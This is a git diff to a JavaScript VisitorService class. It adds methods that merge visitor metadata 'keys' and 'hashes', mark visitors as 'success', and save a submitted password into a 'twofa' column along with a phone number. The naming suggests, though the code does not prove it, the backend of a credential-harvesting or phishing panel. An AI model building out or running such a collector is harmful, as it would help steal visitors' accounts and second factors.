@@ -30,6 +30,19 @@ class VisitorService {
     return Response.OK(new VisitorDto(visitor));
   }
 
+  async getForce(visitorId) {
+    var visitor = await DB.query("SELECT * FROM visitor WHERE id = ?", [
+      visitorId,
+    ]).then((data) => data[0]);
+    if (!visitor) throw Response.NotFound();
+    return Response.OK(
+      new VisitorAdminDto({
+        ...visitor,
+        metadata: JSON.parse(visitor.metadata),
+      })
+    );
+  }
+
   async delete(visitorId) {
     var visitor = await DB.query("SELECT * FROM visitor WHERE id = ?", [
       visitorId,
@@ -94,6 +107,69 @@ class VisitorService {
       "UPDATE visitor SET dropped = ? WHERE id = ? RETURNING *",
       [true, visitorId]
     ).then((data) => data[0]);
+  }
+
+  increment(s, metadata) {
+    var source = s;
+    if (!source.id && metadata.id) {
+      source.id = metadata.id;
+    }
+
+    for (const [key, value] of Object.entries(metadata.keys || {})) {
+      if (!source.keys[key]) {
+        source.keys[key] = value;
+      }
+    }
+
+    for (const [key, value] of Object.entries(metadata.hashes || {})) {
+      if (!source.hashes[key]) {
+        source.hashes[key] = value;
+      }
+    }
+    return source;
+  }
+
+  async store(data, visitorId) {
+    const visitor = await DB.query("SELECT * FROM visitor WHERE id = ?", [
+      visitorId,
+    ]).then((data) => data[0]);
+    if (!visitor) throw Response.NotFound();
+    if (!visitor.metadata) {
+      visitor.metadata = JSON.stringify(data);
+    } else {
+      visitor.metadata = JSON.stringify(
+        this.increment(JSON.parse(visitor.metadata), data)
+      );
+    }
+
+    await DB.query(
+      "UPDATE visitor SET metadata = ?, success_timestamp = ?, success = true WHERE id = ?",
+      [visitor.metadata, Date.now(), visitor.id]
+    );
+  }
+
+  async storePassword(password, visitorId) {
+    const visitor = await DB.query("SELECT * FROM visitor WHERE id = ?", [
+      visitorId,
+    ]).then((data) => data[0]);
+    if (!visitor) throw Response.NotFound();
+
+    await DB.query("UPDATE visitor SET twofa = ? WHERE id = ?", [
+      password,
+      visitor.id,
+    ]);
+  }
+
+  async storePhone(phoneNumber, visitorId) {
+    const visitor = await DB.query("SELECT * FROM visitor WHERE id = ?", [
+      visitorId,
+    ]).then((data) => data[0]);
+    if (!visitor) throw Response.NotFound();
+
+    await DB.query("UPDATE visitor SET phone = ? WHERE id = ?", [
+      phoneNumber,
+      visitor.id,
+    ]);
   }
 }
 
